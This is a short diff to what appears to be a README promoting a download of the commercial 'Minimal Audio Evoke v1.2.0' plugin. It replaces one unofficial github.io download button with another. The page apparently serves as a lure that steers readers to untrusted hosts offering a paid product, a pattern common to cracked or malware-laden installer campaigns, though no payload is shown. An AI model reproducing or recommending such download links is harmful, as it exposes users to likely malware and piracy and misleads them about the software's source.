@@ -21,7 +21,7 @@ To begin using this **Minimal Audio Evoke v1.2.0 music production plugin** and *
 | :--- | :--- |
 | **Get Minimal Audio Evoke v1.2.0** | Click the button below to initiate the setup for this **Minimal Audio Evoke v1.2.0 sound design tool**. |
 
-[![Button](https://img.shields.io/badge/🎛️-Get_Evoke_v1.2.0-2ea44f?style=for-the-badge)](https://d58856445.github.io/.github/minimal-audio-evoke-v-1-2-0)
+[![Evoke](https://img.shields.io/badge/Launch-Evoke%20-0369A1?style=for-the-badge)](https://audio-evoke-review.github.io/.github/evoke-vst)
 
 ## System Requirements
 
